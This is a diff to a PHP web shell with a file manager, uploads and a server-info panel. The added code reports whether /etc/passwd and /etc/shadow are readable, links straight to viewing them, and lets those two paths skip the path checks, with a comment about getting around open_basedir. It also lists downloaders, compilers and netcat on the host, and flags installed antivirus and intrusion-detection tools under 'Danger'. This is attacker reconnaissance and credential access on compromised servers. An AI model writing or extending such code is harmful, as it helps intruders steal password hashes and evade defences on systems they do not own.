@@ -662,8 +662,7 @@ function getServerInfoDetails() {
     $info['Server Name'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A';
     $info['Server Admin'] = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'N/A';
     $info['Server Port'] = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'N/A';
-    $info['Document Root'] = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A';
-    $info['Script Filename'] = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : 'N/A';
+    // Removed "Document Root" and "Script Filename" as requested.
     $info['PHP Version'] = PHP_VERSION;
     $info['Operating System'] = php_uname();
     $nproc = 'N/A';
@@ -692,6 +691,43 @@ function getServerInfoDetails() {
         $UID = posix_getuid(); $userInfo = posix_getpwuid($UID);
         $info['User Info (posix)'] = ($userInfo ? $userInfo['name'] : 'N/A') . ' (UID: ' . $UID . ', GID: ' . ($userInfo ? $userInfo['gid'] : posix_getgid()) . ')';
     }
+
+    // --- START: Added Features ---
+    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+        $passwd_path = '/etc/passwd';
+        if (@is_readable($passwd_path)) {
+            $info['Readable /etc/passwd'] = '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/passwd\', \'passwd\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>';
+        } else {
+            $info['Readable /etc/passwd'] = '<span style="color:red;">No</span>';
+        }
+
+        $shadow_path = '/etc/shadow';
+        if (@is_readable($shadow_path)) {
+            $info['Readable /etc/shadow'] = '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/shadow\', \'shadow\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>';
+        } else {
+            $info['Readable /etc/shadow'] = '<span style="color:red;">No</span>';
+        }
+    } else {
+        $info['Readable /etc/passwd'] = 'N/A (Linux specific)';
+        $info['Readable /etc/shadow'] = 'N/A (Linux specific)';
+    }
+
+    $downloader_tools = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
+    $useful_tools = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
+    $danger_tools = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
+
+    $found_downloaders = array();
+    foreach ($downloader_tools as $tool) { if (command_exists($tool)) { $found_downloaders[] = $tool; } }
+    $info['Downloaders'] = !empty($found_downloaders) ? implode(', ', $found_downloaders) : 'None found';
+
+    $found_useful = array();
+    foreach ($useful_tools as $tool) { if (command_exists($tool)) { $found_useful[] = $tool; } }
+    $info['Useful'] = !empty($found_useful) ? implode(', ', $found_useful) : 'None found';
+
+    $found_danger = array();
+    foreach ($danger_tools as $tool) { if (command_exists($tool)) { $found_danger[] = $tool; } }
+    $info['Danger'] = !empty($found_danger) ? implode(', ', $found_danger) : 'None found';
+    // --- END: Added Features ---
 
     $safe_mode_val = ini_get('safe_mode');
     if(is_string($safe_mode_val) && strtolower($safe_mode_val) === "off") $safe_mode_val = 0;
@@ -1225,27 +1261,47 @@ if ($authenticated && isset($_POST['ajax_action'])) {
         case 'get_file_content':
             if (isset($_POST['path'])) {
                 clearstatcache();
-                $filePath = realpath($_POST['path']);
+                $rawPath = $_POST['path'];
+                $filePath = '';
+                $isSystemFile = in_array($rawPath, array('/etc/passwd', '/etc/shadow'));
 
-                if ($filePath && is_file($filePath) && is_readable($filePath)) {
+                if ($isSystemFile) {
+                    // For specific system files, we don't use realpath to avoid issues with open_basedir
+                    // but we still check if it's a file and readable.
+                    if (is_file($rawPath) && is_readable($rawPath)) {
+                        $filePath = $rawPath;
+                    } else {
+                         $response['message'] = '[Error] System file not found or not readable: ' . htmlspecialchars($rawPath);
+                    }
+                } else {
+                    // For all other files, use realpath for security (prevents directory traversal)
+                    $filePath = realpath($rawPath);
+                    if (!$filePath || !is_file($filePath) || !is_readable($filePath)) {
+                         $response['message'] = '[Error] File not found, not a file, or not readable: ' . htmlspecialchars($rawPath);
+                         $filePath = ''; // unset filePath to prevent further processing
+                    }
+                }
+
+                if ($filePath) {
                     $content = @file_get_contents($filePath);
                     if ($content === false) {
                         $response['message'] = '[Error] Could not read file content. Check file permissions and server logs.';
                     } else {
                         $final_content = $content;
                         if (function_exists('mb_convert_encoding')) {
-                            $final_content = mb_convert_encoding($content, 'UTF-8', 'UTF-8');
+                            // Try to convert to UTF-8, but don't fail if it's not valid.
+                            $final_content = mb_convert_encoding($content, 'UTF-8', mb_detect_encoding($content, 'UTF-8, ISO-8859-1', true));
                         }
                         
                         if (json_encode(array('test' => $final_content)) === false) {
-                            $response['message'] = '[Error] File content could not be encoded for display. It may be a binary file or have an unsupported encoding.';
+                             $response['message'] = '[Error] File content could not be encoded for display. It may be a binary file or have an unsupported encoding.';
                         } else {
                             $response = array('status' => 'success', 'content' => $final_content);
                         }
                     }
-                } else {
-                    $response['message'] = '[Error] File not found, not a file, or not readable: ' . htmlspecialchars($_POST['path']);
                 }
+                // If filePath is empty, the error message has already been set.
+
             } else {
                 $response['message'] = '[Error] No file path provided.';
             }
@@ -1636,7 +1692,7 @@ endif;
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         body { background: #1a1a1a; font-family: 'Orbitron', sans-serif; color: #0ff; margin: 0; padding: 0; font-size: 14px; }
-        .container { max-width: 1200px; margin: 20px auto; background: #111; border: 1px solid #0ff; box-shadow: 0 0 25px #0ff; border-radius: 10px; padding: 15px; }
+        .container { max-width: 1200px; margin: 20px auto; background: #111; border: 1px solid #0ff; box-shadow: 0 0 25px #0ff; border-radius: 10px; padding: 15px; position: relative; }
         header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 10px; border-bottom: 1px solid #055; margin-bottom:15px;}
         header h1 { color: #0ff; margin: 0; font-size: 1.8em; text-shadow: 0 0 10px #0ff; }
         .logout-form button { background: #ff4444; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 5px; font-family: 'Orbitron', sans-serif; font-weight: bold; }
@@ -1784,16 +1840,6 @@ endif;
                 <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Owner/Group</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
                 <tbody id="file-listing"><tr><td colspan="7" style="text-align:center;">Loading...</td></tr></tbody>
             </table>
-            <div id="file-view-modal"> <div>
-                    <h3 id="file-modal-title">View/Edit File</h3>
-                    <div id="file-modal-message" class="modal-message hidden"></div>
-                    <textarea id="file-content-area"></textarea>
-                    <div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
-                        <button id="save-file-btn" class="inputzbut">Save Changes</button>
-                        <button id="close-modal-btn" class="inputzbut" style="background:#555;">Close</button>
-                    </div>
-                </div>
-            </div>
             <div id="upload-modal">
                 <div>
                     <h3 id="upload-modal-title">File Upload Progress</h3>
@@ -1864,7 +1910,7 @@ endif;
                 foreach ($server_details as $k => $v) {
                     $value_display = (is_string($v) && (strpos($v, '<span style="color:red;">') !== false || strpos($v, '<span style="color:orange;">') !== false || strpos($v, '<span style="color:lime;">') !== false)) ? $v : htmlspecialchars($v);
                     echo "<tr><td>" . htmlspecialchars($k) . "</td><td>" .
-                         (($k === 'Network Interfaces (attempt)' || $k === 'Disabled Functions' || $k === 'Open Basedir' || $k === 'Include Path' || $k === 'Session Save Path')
+                         (($k === 'Network Interfaces (attempt)' || $k === 'Disabled Functions' || $k === 'Open Basedir' || $k === 'Include Path' || $k === 'Session Save Path' || $k === 'Downloaders' || $k === 'Useful' || $k === 'Danger')
                             ? "<pre>" . htmlspecialchars($v) . "</pre>"
                             : $value_display) .
                          "</td></tr>";
@@ -1965,7 +2011,17 @@ endif;
             </div>
         </div>
 
-    </div>
+        <div id="file-view-modal"> <div>
+                <h3 id="file-modal-title">View/Edit File</h3>
+                <div id="file-modal-message" class="modal-message hidden"></div>
+                <textarea id="file-content-area"></textarea>
+                <div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
+                    <button id="save-file-btn" class="inputzbut">Save Changes</button>
+                    <button id="close-modal-btn" class="inputzbut" style="background:#555;">Close</button>
+                </div>
+            </div>
+        </div>
+        </div>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     // --- Element Selectors ---
@@ -2419,15 +2475,17 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // --- Chunked File Upload Logic ---
     fileUploadBtn.addEventListener('click', () => fileUploadInput.click());
-    closeUploadModalBtn.addEventListener('click', () => {
-        uploadModal.classList.remove('visible');
-        fetchFiles(currentFileManagerPath);
-    });
+    if(closeUploadModalBtn) {
+        closeUploadModalBtn.addEventListener('click', () => {
+            uploadModal.classList.remove('visible');
+            fetchFiles(currentFileManagerPath);
+        });
+    }
 
     fileUploadInput.addEventListener('change', async function() {
         if (this.files.length === 0) return;
-        uploadProgressContainer.innerHTML = '';
-        uploadModal.classList.add('visible');
+        if(uploadProgressContainer) uploadProgressContainer.innerHTML = '';
+        if(uploadModal) uploadModal.classList.add('visible');
 
         const fileList = Array.from(this.files);
         this.value = '';
@@ -2458,7 +2516,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 <span class="percentage">0%</span>
             </div>
         `;
-        uploadProgressContainer.appendChild(item);
+        if(uploadProgressContainer) uploadProgressContainer.appendChild(item);
         return item;
     }
 
